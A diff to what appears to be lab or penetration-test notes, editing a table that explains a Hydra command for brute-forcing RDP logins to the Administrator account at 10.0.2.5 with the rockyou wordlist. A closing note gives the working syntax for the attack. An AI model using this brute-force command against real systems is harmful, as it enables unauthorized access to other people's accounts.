@@ -154,7 +154,7 @@ hydra -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://10.0.2.5 -t 1
 |---|---|
 | `-l Administrator` | Target the built-in Administrator account |
 | `-P rockyou.txt` | 14.3M password wordlist |
-| `rdp://10.0.2.5` | RDP syntax (required — bare IP fails) |
+| `rdp://10.0.2.5` | RDP syntax |
 | `-t 1` | Single thread (multiple threads break RDP) |
 
 > **Lesson learned:** Initial command used `10.0.2.5 rdp` (wrong) instead of `rdp://10.0.2.5` (correct). The URI prefix and `-t 1` flag are both mandatory for Hydra RDP attacks.
